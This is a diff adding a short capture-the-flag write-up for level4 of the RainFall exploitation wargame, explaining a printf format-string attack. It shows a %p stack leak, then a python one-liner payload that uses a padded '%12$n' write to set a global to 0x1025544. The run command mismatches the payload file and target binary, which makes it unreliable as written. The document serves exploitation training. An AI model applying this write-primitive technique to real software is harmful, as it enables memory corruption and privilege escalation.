@@ -1,0 +1,28 @@
+This level is pretty the same as the flag before
+
+0x08048488 <+49>:    call   0x8048444 <p>
+0x0804848d <+54>:    mov    eax,ds:0x8049810
+0x08048492 <+59>:    cmp    eax,0x1025544
+
+but this time it calls printf from an another function
+so the offset to the buffer is a little further
+
+level4@RainFall:~$ ./level4
+AAAA %p %p %p %p %p %p %p %p %p %p %p %p %p %p
+AAAA 0xb7ff26b0 0xbffff794 0xb7fd0ff4 (nil) (nil) 0xbffff758 0x804848d 0xbffff550 0x200 0xb7fd1ac0 0xb7ff37d0 0x41414141 0x20702520 0x25207025
+
+the offset in the stack is at the 12th position (0x41414141)
+to do so, we do the same as the level before, set the address where we want to write, and then %n to write the number of octet already printer so far =)
+
+the thing is, it compare eax with 0x1025544 (which is 16930116 in decimal), the buffer length is size of 512 octet, its impossible to write them ^^
+to do the trick, we can use printf format padding (%98x) will print ' ' * 98 times before the %x
+
+doing this while write the 16930112 + 4 (4 octets address length) = 16930116 inside the offset 12th pointer (which is our buffer)
+
+
+python -c 'import sys; sys.stdout.write("\x10\x98\x04\x08" + "%16930112x%12$n")' > /tmp/input
+
+cat /tmp/test - | ./level3
+
+useful link
+https://axcheron.github.io/exploit-101-format-strings/
